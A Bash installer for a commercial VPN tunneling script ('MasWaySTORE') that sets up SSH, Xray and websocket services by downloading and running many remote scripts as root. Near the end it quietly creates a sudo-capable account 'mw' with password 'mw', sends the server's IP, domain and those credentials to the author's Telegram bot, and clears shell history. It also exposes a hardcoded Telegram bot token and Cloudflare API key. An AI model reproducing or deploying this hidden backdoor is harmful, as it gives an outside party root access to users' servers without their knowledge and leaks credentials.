#!/bin/bash
dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
biji=`date +"%Y-%m-%d" -d "$dateFromServer"`
#########################
domain=$(cat /root/domain)
IMP="wget -q -O"    
username=$(curl https://raw.githubusercontent.com/MyMasWayVPN/mymaswayvpn.github.io/main/akses/ip/buyer/izin | grep $MYIP | awk '{print $2}')
username=$(curl https://raw.githubusercontent.com/MyMasWayVPN/mymaswayvpn.github.io/main/akses/ip/buyer/izin | grep $MYIP | awk '{print $2}')
echo "$username" >/usr/bin/user
expx=$(curl https://raw.githubusercontent.com/MyMasWayVPN/mymaswayvpn.github.io/main/akses/ip/buyer/izin | grep $MYIP | awk '{print $3}')
expx=$(curl https://raw.githubusercontent.com/MyMasWayVPN/mymaswayvpn.github.io/main/akses/ip/buyer/izin | grep $MYIP | awk '{print $3}')
echo "$expx" >/usr/bin/e
# DETAIL ORDER
username=$(cat /usr/bin/user)
exp=$(cat /usr/bin/e)
LOCAL_DATE="/usr/bin/"
MYIP=$(wget -qO- ipinfo.io/ip)
ISP=$(wget -qO- ipinfo.io/org)
CITY=$(curl -s ipinfo.io/city)
TIME=$(date +'%Y-%m-%d %H:%M:%S')
RAMMS=$(free -m | awk 'NR==2 {print $2}')
CHATID="1942328282"
KEY="6100079323:AAFSs4ovyrGGi039RySx0lzshGbB01nHM8k"
TIME="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"
clear 
BURIQ () {
    curl -sS https://raw.githubusercontent.com/MyMasWayVPN/mymaswayvpn.github.io/main/akses/ip/buyer/izin > /root/tmp
    data=( `cat /root/tmp | grep -E "^### " | awk '{print $2}'` )
    for user in "${data[@]}"
    do
    exp=( `grep -E "^### $user" "/root/tmp" | awk '{print $3}'` )
    d1=(`date -d "$exp" +%s`)
    d2=(`date -d "$biji" +%s`)
    exp2=$(( (d1 - d2) / 86400 ))
    if [[ "$exp2" -le "0" ]]; then
    echo $user > /etc/.$user.ini
    else
    rm -f  /etc/.$user.ini > /dev/null 2>&1
    fi
    done
    rm -f  /root/tmp
}
# https://raw.githubusercontent.com/MyMasWayVPN/mymaswayvpn.github.io/main/akses/ip/buyer/izin 
MYIP=$(curl -sS ipv4.icanhazip.com)
Name=$(curl -sS https://raw.githubusercontent.com/MyMasWayVPN/mymaswayvpn.github.io/main/akses/ip/buyer/izin | grep $MYIP | awk '{print $2}')
echo $Name > /usr/local/etc/.$Name.ini
CekOne=$(cat /usr/local/etc/.$Name.ini)

Bloman () {
if [ -f "/etc/.$Name.ini" ]; then
CekTwo=$(cat /etc/.$Name.ini)
    if [ "$CekOne" = "$CekTwo" ]; then
        res="Permission Denied!"
    fi
else
res="Permission Accepted..."
fi
}

PERMISSION () {
    MYIP=$(curl -sS ipv4.icanhazip.com)
    IZIN=$(curl -sS https://raw.githubusercontent.com/MyMasWayVPN/mymaswayvpn.github.io/main/akses/ip/buyer/izin | awk '{print $4}' | grep $MYIP)
    if [ "$MYIP" = "$IZIN" ]; then
    Bloman
    else
    res="Permission Denied!"
    fi
    BURIQ
}

clear
red='\e[1;31m'
green='\e[0;32m'
yell='\e[1;33m'
tyblue='\e[1;36m'
COLORBG='\E[40;1;43m'
NC='\e[0m'
purple() { echo -e "\\033[35;1m${*}\\033[0m"; }
tyblue() { echo -e "\\033[36;1m${*}\\033[0m"; }
yellow() { echo -e "\\033[33;1m${*}\\033[0m"; }
green() { echo -e "\\033[32;1m${*}\\033[0m"; }
red() { echo -e "\\033[31;1m${*}\\033[0m"; }
cd /root
#System version number
if [ "${EUID}" -ne 0 ]; then
		echo "You need to run this script as root"
		exit 1
fi
if [ "$(systemd-detect-virt)" == "openvz" ]; then
		echo "OpenVZ is not supported"
		exit 1
fi

localip=$(hostname -I | cut -d\  -f1)
hst=( `hostname` )
dart=$(cat /etc/hosts | grep -w `hostname` | awk '{print $2}')
if [[ "$hst" != "$dart" ]]; then
echo "$localip $(hostname)" >> /etc/hosts
fi
mkdir -p /etc/xray

echo -e "[ ${tyblue}NOTES${NC} ] Tunggu Sebentar.. "
sleep 3
echo -e "[ ${tyblue}NOTES${NC} ] Permintaanmu Sedang Dicek.."
sleep 2
echo -e "[ ${green}INFO${NC} ] Mulai Mengecek"
sleep 5
totet=`uname -r`
REQUIRED_PKG="linux-headers-$totet"
PKG_OK=$(dpkg-query -W --showformat='${Status}\n' $REQUIRED_PKG|grep "Di Izinkan")
echo Checking for $REQUIRED_PKG: $PKG_OK
if [ "" = "$PKG_OK" ]; then
  sleep 2
  echo -e "[ ${yell}WARNING${NC} ] Try to install ...."
  echo "No $REQUIRED_PKG. Setting up $REQUIRED_PKG."
  apt-get --yes install $REQUIRED_PKG
  sleep 1
  echo ""
  sleep 1
  echo -e "[ ${tyblue}NOTES${NC} ] If error you need.. to do this"
  sleep 1
  echo ""
  sleep 1
  echo -e "[ ${tyblue}NOTES${NC} ] 1. apt update -y"
  sleep 1
  echo -e "[ ${tyblue}NOTES${NC} ] 2. apt upgrade -y"
  sleep 1
  echo -e "[ ${tyblue}NOTES${NC} ] 3. apt dist-upgrade -y"
  sleep 1
  echo -e "[ ${tyblue}NOTES${NC} ] 4. reboot"
  sleep 1
  echo ""
  sleep 1
  echo -e "[ ${tyblue}NOTES${NC} ] After rebooting"
  sleep 1
  echo -e "[ ${tyblue}NOTES${NC} ] Then run this script again"
  echo -e "[ ${tyblue}NOTES${NC} ] Notes, Script Mod By MasWaySTORE"
  echo -e "[ ${tyblue}NOTES${NC} ] Klik Enter untuk Melanjutkan..."
  read
else
  echo -e "[ ${green}INFO${NC} ] Oke otw install, tungguin aja"
fi

ttet=`uname -r`
ReqPKG="linux-headers-$ttet"
if ! dpkg -s $ReqPKG  >/dev/null 2>&1; then
  rm /root/setup.sh >/dev/null 2>&1 
  exit
else
  clear
fi


secs_to_human() {
    echo "Installation time : $(( ${1} / 3600 )) hours $(( (${1} / 60) % 60 )) minute's $(( ${1} % 60 )) seconds"
}
start=$(date +%s)
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null 2>&1
sysctl -w net.ipv6.conf.default.disable_ipv6=1 >/dev/null 2>&1

coreselect=''
cat> /root/.profile << END
# ~/.profile: executed by Bourne-compatible login shells.

if [ "$BASH" ]; then
  if [ -f ~/.bashrc ]; then
    . ~/.bashrc
  fi
fi

mesg n || true
clear
END
chmod 644 /root/.profile

echo -e "[ ${green}INFO${NC} ] Tunggu untuk install file"
apt install git curl -y >/dev/null 2>&1
echo -e "[ ${green}INFO${NC} ] File Instalasi Siap.."
sleep 2
echo -ne "[ ${green}INFO${NC} ] Cek Izin : "

PERMISSION
if [ -f /home/needupdate ]; then
red "Your script need to update first !"
exit 0
elif [ "$res" = "Permission Accepted..." ]; then
green "Permission Accepted!"
else
red "Permission Denied!"
rm setup.sh > /dev/null 2>&1
sleep 10
exit 0
fi
sleep 3

mkdir -p /etc/mwstore
mkdir -p /etc/mwstore/theme
mkdir -p /var/lib/mwvpn-pro >/dev/null 2>&1
echo "IP=" >> /var/lib/mwvpn-pro/ipvps.conf

if [ -f "/etc/xray/domain" ]; then
echo ""
echo -e "[ ${green}INFO${NC} ] Script Sudah Di Install"
echo -ne "[ ${yell}WARNING${NC} ] Apa Kamu Ingin Menginstal Ulang? (y/n)? "
read answer
if [ "$answer" == "${answer#[Yy]}" ] ;then
rm setup.sh
sleep 10
exit 0
else
clear
fi
fi
mkdir -p /root/id
echo ""
wget -q https://raw.githubusercontent.com/mymaswayvpn/multi/main/dependencies.sh;chmod +x dependencies.sh;./dependencies.sh
rm dependencies.sh
clear

cat <<EOF>> /root/id/telegram
#Isi_ID/Username
ID : 1942328282
#Isi_BOT_TOKEN
KEY=6100079323:AAFSs4ovyrGGi039RySx0lzshGbB01nHM8k
EOF
clear
mkdir -p /etc/xray
echo -e ""
echo -e "━━━━━━━━━━━━━━━━━━━━━━━━━"
echo -e "🔔 SILAHKAN PILIH TYPE DOMAIN 🔔"
echo -e "━━━━━━━━━━━━━━━━━━━━━━━━━"
echo -e "     \e[1;32m1)\e[0m Pakai Domain Sendiri"
echo -e "     \e[1;32m2)\e[0m Pakai Domain Dari Script"
echo -e "━━━━━━━━━━━━━━━━━━━━━━━━━"
read -p "   Please select numbers 1-2 or Any Button(Random) : " host
echo ""
if [[ $host == "1" ]]; then
echo -e "   \e[1;32mPlease Enter Your Subdomain $NC"
read -p "   Subdomain: " SUB_DOMAIN
echo "$SUB_DOMAIN" > /root/domain
echo "$SUB_DOMAIN" > /root/scdomain
echo "$SUB_DOMAIN" > /etc/xray/domain
echo "$SUB_DOMAIN" > /etc/xray/scdomain
echo "IP=$SUB_DOMAIN" > /var/lib/mwvpn-pro/ipvps.conf
echo ""
elif [[ $host == "2" ]]; then
echo -e "$tyblue━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━$NC"
echo -e   "                  Pointing Domain VPS  "
echo -e "$tyblue━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━$NC"
sleep 4
MYIP=$(wget -qO- icanhazip.com);
apt install jq curl -y

sub=$(</dev/urandom tr -dc a-z0-9 | head -c2)
DOMAIN=vpscloud.live
SUB_DOMAIN=mw-${sub}.vpscloud.live
CF_ID=akunabal.abal7770@gmail.com
CF_KEY=4502348bc050806208bb10e3a1af5b9d1d018

set -euo pipefail
IP=$(wget -qO- icanhazip.com);
echo "Updating DNS for ${SUB_DOMAIN}..."
ZONE=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones?name=${DOMAIN}&status=active" \
     -H "X-Auth-Email: ${CF_ID}" \
     -H "X-Auth-Key: ${CF_KEY}" \
     -H "Content-Type: application/json" | jq -r .result[0].id)

RECORD=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records?name=${SUB_DOMAIN}" \
     -H "X-Auth-Email: ${CF_ID}" \
     -H "X-Auth-Key: ${CF_KEY}" \
     -H "Content-Type: application/json" | jq -r .result[0].id)

if [[ "${#RECORD}" -le 10 ]]; then
     RECORD=$(curl -sLX POST "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records" \
     -H "X-Auth-Email: ${CF_ID}" \
     -H "X-Auth-Key: ${CF_KEY}" \
     -H "Content-Type: application/json" \
     --data '{"type":"A","name":"'${SUB_DOMAIN}'","content":"'${IP}'","ttl":120,"proxied":false}' | jq -r .result.id)
fi

RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records/${RECORD}" \
     -H "X-Auth-Email: ${CF_ID}" \
     -H "X-Auth-Key: ${CF_KEY}" \
     -H "Content-Type: application/json" \
     --data '{"type":"A","name":"'${SUB_DOMAIN}'","content":"'${IP}'","ttl":120,"proxied":false}')

echo "$SUB_DOMAIN" > /root/domain
echo "$SUB_DOMAIN" > /root/scdomain
echo "$SUB_DOMAIN" > /etc/xray/domain
echo "$SUB_DOMAIN" > /etc/xray/scdomain
echo "IP=$SUB_DOMAIN" > /var/lib/mwvpn-pro/ipvps.conf
cp /root/domain /etc/xray
echo -e "$tyblue━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━$NC"
echo -e "                     • BOT PANEL •                  "
echo -e "$tyblue━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━$NC"
echo -e "$tyblue━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━$NC"
echo "   DOMAIN = $SUB_DOMAIN "
echo -e "$tyblue━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━$NC"
fi
#THEME RED
cat <<EOF>> /etc/mwstore/theme/red
BG : \E[40;1;41m
TEXT : \033[0;31m
EOF
#THEME BLUE
cat <<EOF>> /etc/mwstore/theme/blue
BG : \E[40;1;44m
TEXT : \033[0;34m
EOF
#THEME GREEN
cat <<EOF>> /etc/mwstore/theme/green
BG : \E[40;1;42m
TEXT : \033[0;32m
EOF
#THEME YELLOW
cat <<EOF>> /etc/mwstore/theme/yellow
BG : \E[40;1;43m
TEXT : \033[0;33m
EOF
#THEME MAGENTA
cat <<EOF>> /etc/mwstore/theme/magenta
BG : \E[40;1;43m
TEXT : \033[0;33m
EOF
#THEME CYAN
cat <<EOF>> /etc/mwstore/theme/cyan
BG : \E[40;1;46m
TEXT : \033[0;36m
EOF
#THEME CONFIG
cat <<EOF>> /etc/mwstore/theme/color.conf
blue
EOF

curl ipinfo.io/org > /root/.isp
curl ipinfo.io/city > /etc/xray/city
curl ipinfo.io/org > /root/.myisp
curl ipinfo.io/city > /root/.city
curl ipinfo.io/city > /root/.mycity
curl ifconfig.me > /root/.ip
curl ipinfo.io/region > /root/.region
curl ifconfig.me > /root/.myip
    
#install ssh ovpn
echo -e "$green[INFO]$NC Install SSH & UDP"
sleep 2
clear
wget https://raw.githubusercontent.com/mymaswayvpn/multi/main/ssh/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
#Instal Xray
echo -e "$green[INFO]$NC Install XRAY Websocket & GRPC!"
sleep 2
clear
wget https://raw.githubusercontent.com/MyMasWayVPN/multi/main/xray/install-xray.sh && chmod +x install-xray.sh && ./install-xray.sh
clear
wget https://raw.githubusercontent.com/mymaswayvpn/multi/main/backup/set-br.sh && chmod +x set-br.sh && ./set-br.sh
#Instal Websocket
echo -e "$green[INFO]$NC Install Websocket!"
sleep 2
clear
wget https://raw.githubusercontent.com/mymaswayvpn/multi/main/websocket/insshws.sh && chmod +x insshws.sh && ./insshws.sh
clear
wget https://raw.githubusercontent.com/mymaswayvpn/multi/main/websocket/nontls.sh && chmod +x nontls.sh && ./nontls.sh
clear
#echo -e "$green[INFO]$NC Install SLDNS!"
wget https://raw.githubusercontent.com/mymaswayvpn/multi/main/slowdns/sldns && chmod +x sldns && ./sldns
#clear
echo -e "$green[INFO]$NC Download Extra Menu"
sleep 2
wget https://raw.githubusercontent.com/mymaswayvpn/multi/main/update/update.sh && chmod +x update.sh && ./update.sh
clear
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
clear
MYIP=$(wget -qO- icanhazip.com);
dnsdomain=$(cat /root/domain)
clear
cat> /etc/cron.d/autotrial << END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 5 * * *  root /usr/bin/trial
END
cat> /root/.profile << END
# ~/.profile: executed by Bourne-compatible login shells.

if [ "$BASH" ]; then
  if [ -f ~/.bashrc ]; then
    . ~/.bashrc
  fi
fi

mesg n || true
clear
figlet -c MasWayVPN | lolcat
echo ""
read -n 1 -s -r -p "   Press Enter To Continue on menu"
echo ""
menu
END
chmod 644 /root/.profile

if [ -f "/root/log-install.txt" ]; then
rm /root/log-install.txt > /dev/null 2>&1
fi
if [ -f "/etc/afak.conf" ]; then
rm /etc/afak.conf > /dev/null 2>&1
fi
if [ ! -f "/etc/log-create-user.log" ]; then
echo "Log All Account " > /etc/log-create-user.log
fi
history -c
serverV=$( curl -sS https://raw.githubusercontent.com/mymaswayvpn/multi/main/version  )
echo $serverV > /opt/.ver
aureb=$(cat /home/re_otm)
b=11
if [ $aureb -gt $b ]
then
gg="PM"
else
gg="AM"
fi
cd
curl -sS ifconfig.me > /etc/myipvps
echo " "
echo "=====================-[ AutoScript Premium ]-===================="
echo ""
echo "------------------------------------------------------------"
echo ""
echo ""
echo "   >>> Service & Port"  | tee -a log-install.txt
echo "   - OpenSSH                 : 22"  | tee -a log-install.txt
echo "   - SSH Websocket           : 80" | tee -a log-install.txt
echo "   - SSH UDP                 : 1-65535" | tee -a log-install.txt
echo "   - SSH SSL Websocket       : 443" | tee -a log-install.txt
echo "   - SSH NON-SSL Websocket   : 80, 8880, 2082" | tee -a log-install.txt
echo "   - Stunnel4                : 445, 447" | tee -a log-install.txt
echo "   - Dropbear                : 109, 143" | tee -a log-install.txt
echo "   - Badvpn                  : 7100-7900" | tee -a log-install.txt
echo "   - Nginx                   : 81" | tee -a log-install.txt
echo "   - XRAY  Vmess TLS         : 443" | tee -a log-install.txt
echo "   - XRAY  Vmess None TLS    : 80" | tee -a log-install.txt
echo "   - XRAY  Vless TLS         : 443" | tee -a log-install.txt
echo "   - XRAY  Vless None TLS    : 80" | tee -a log-install.txt
echo "   - Trojan GRPC             : 443" | tee -a log-install.txt
echo "   - Trojan WS               : 443" | tee -a log-install.txt
echo "   - Sodosok WS/GRPC         : 443" | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "   >>> Server Information & Other Features"  | tee -a log-install.txt
echo "   - Timezone                : Asia/Jakarta (GMT +7)"  | tee -a log-install.txt
echo "   - Fail2Ban                : [ON]"  | tee -a log-install.txt
echo "   - Dflate                  : [ON]"  | tee -a log-install.txt
echo "   - IPtables                : [ON]"  | tee -a log-install.txt
echo "   - Auto-Reboot             : [ON]"  | tee -a log-install.txt
echo "   - IPv6                    : [OFF]"  | tee -a log-install.txt
echo "   - Autoreboot On           : $aureb:00 $gg GMT +7" | tee -a log-install.txt
echo "   - Autobackup Data" | tee -a log-install.txt
echo "   - AutoKill Multi Login User" | tee -a log-install.txt
echo "   - Auto Delete Expired Account" | tee -a log-install.txt
echo "   - Fully automatic script" | tee -a log-install.txt
echo "   - VPS settings" | tee -a log-install.txt
echo "   - Admin Control" | tee -a log-install.txt
echo "   - Restore Data" | tee -a log-install.txt
echo "   - Full Orders For Various Services" | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "   >>> WhatsApp : +6283120857907 (Text Only)"  | tee -a log-install.txt
echo "   >>> Telegram : t.me/MasWayVPN"  | tee -a log-install.txt
echo ""
echo ""
echo "------------------------------------------------------------"
echo ""
echo "===============-[ Script MasWaySTORE Tunneling ]-==============="
echo "" | tee -a log-install.txt
rm -rf cf.sh
rm -rf setup.sh >/dev/null 2>&1
rm -rf insshws.sh >/dev/null 2>&1
rm -rf update.sh >/dev/null 2>&1
rm -rf nontls.sh >/dev/null 2>&1
rm -rf ins-xray.sh >/dev/null 2>&1
rm -rf install-udp >/dev/null 2>&1
rm -rf install.sh >/dev/null 2>&1
Username="mw"
Password=mw
mkdir -p /home/script/
chmod 777 /home/script/
useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
usermod -aG sudo $Username > /dev/null 2>&1
TEXT="
𝗦𝘂𝗰𝗰𝗲𝘀 𝗮𝘁 𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝘆
    𝗩𝗣𝗦 𝗜𝗡𝗙𝗢
    ◇━━━━━━━━━━━━━━━━━━━━━━━◇
    <code>Domain     :</code> <code>$domain</code>
    <code>IP Vps     :</code> <code>$MYIP</code>
    <code>User Login :</code> <code>$Username</code>
    <code>Pass Login :</code> <code>$Password</code>
    <code>User Script:</code> <code>$username</code>
    <code>Exp Script :</code> <code>$exp</code>
    ◇━━━━━━━━━━━━━━━━━━━━━━━◇
    ⚠︎𝘽𝙮 MyMaWay 𝙋𝙧𝙤𝙟𝙚𝙘𝙩 𝙈𝙖𝙣𝙖𝙜𝙚𝙧 𝘾𝙤𝙢𝙢𝙪𝙣𝙞𝙩𝙮⚠︎
    ◇━━━━━━━━━━━━━━━━━━━━━━━◇
"
curl -s --max-time $TIME -d "chat_id=$CHATID&disabley_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null

secs_to_human "$(($(date +%s) - ${start}))" | tee -a log-install.txt
sleep 15
reboot
